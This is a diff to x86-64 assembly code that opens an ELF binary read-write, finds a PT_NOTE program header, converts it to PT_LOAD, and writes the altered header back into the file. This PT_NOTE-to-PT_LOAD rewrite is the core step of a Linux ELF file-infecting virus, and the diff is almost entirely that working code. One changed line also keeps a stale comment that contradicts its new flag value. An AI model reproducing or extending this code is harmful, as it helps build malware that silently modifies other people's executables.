@@ -66,7 +66,7 @@ read_file:
   ; Open the file
   mov rax, 2           ; syscall number for 'open'
   mov rdi, pathname     ; pointer to the filename (first argument for 'open')
-  xor rsi, rsi          ; flags = 0 (O_RDONLY = 0) for read-only mode
+  mov rsi, 0x2          ; flags = 0 (O_RDONLY = 0) for read-only mode
   syscall
 
   ; Check if the file was opened successfully
@@ -208,7 +208,16 @@ loop_ph:
   cmp eax, 0x4                      ; Compare with PT_NOTE (0x4)
   jne next_ph
 
-  ; PT_NOTE found: Print the message
+  
+
+  ; Debug: Print ph_entry buffer before modification
+  ;mov rax, 1            ; syscall: write
+  ;mov rdi, 1            ; stdout
+  ;lea rsi, [ph_entry]   ; Buffer
+  ;mov rdx, 2           ; Length
+  ;syscall
+
+; PT_NOTE found: Print the message
   push rdx
   push rcx
   mov rax, 1                        ; syscall: write
@@ -219,12 +228,75 @@ loop_ph:
   pop rcx
   pop rdx
 
+  ; Modify the program header type to PT_LOAD (0x01)
+  mov dword [ph_entry], 0x1
+
+  ; Debug: Print ph_entry buffer after modification
+;mov rax, 1            ; syscall: write
+;mov rdi, 1            ; stdout
+;lea rsi, [ph_entry]   ; Buffer
+;mov rdx, 2           ; Length
+;syscall
+
+  ; Write the modified program header back
+  push rcx                          ; Save rcx
+  push rdx                          ; Save rdx
+  mov rdi, rbx                      ; Offset to the current program header
+  lea rsi, [ph_entry]               ; Buffer containing the modified program header
+  mov rdx, 64                       ; Size of the program header
+  call write_at_offset              ; Call the function to write the modified header back
+  pop rdx                           ; Restore rdx
+  pop rcx                           ; Restore rcx
+
 next_ph:
   add rbx, rdx                      ; Move to the next program header
   dec rcx                           ; Decrement header count
   jmp loop_ph
 
 done_ph:
+  ret
+
+; -----------------------------
+; Function: write_at_offset
+; Write data to a specific offset in the file.
+; Arguments:
+;   rdi = offset (start of program header)
+;   rsi = buffer (e.g., ph_entry)
+;   rdx = size (e.g., size of the program header)
+; -----------------------------
+write_at_offset:
+  push r10                          ; Save r10 and r11 (callee-saved registers)
+  push r11
+
+  ; Perform lseek to move to the given offset
+  mov rax, 8                        ; syscall: lseek
+  mov r10, [fd]                     ; File descriptor
+  mov r11, rdi                      ; Offset (rdi passed to function)
+  mov rdi, r10                      ; File descriptor
+  mov r10, rsi
+  mov rsi, r11                      ; Offset
+  xor rdx, rdx                      ; SEEK_SET
+  syscall
+  test rax, rax                     ; Check for errors
+  js error                          ; Jump to error if lseek failed
+
+
+  ; Perform the write at the current offset
+  mov rax, 1                        ; syscall: write
+  mov rdi, [fd]                      ; File descriptor
+  mov rsi, r10
+  mov rdx, 64 
+  syscall                           ; Buffer is already in rsi, size in rdx
+  test rax, rax                     ; Check for errors
+  js error
+
+  mov rax, 74         ; syscall: fsync
+  mov rdi, [fd]       ; File descriptor
+  syscall
+
+
+  pop r11                           ; Restore r10 and r11
+  pop r10
   ret
 
 ; -----------------------------
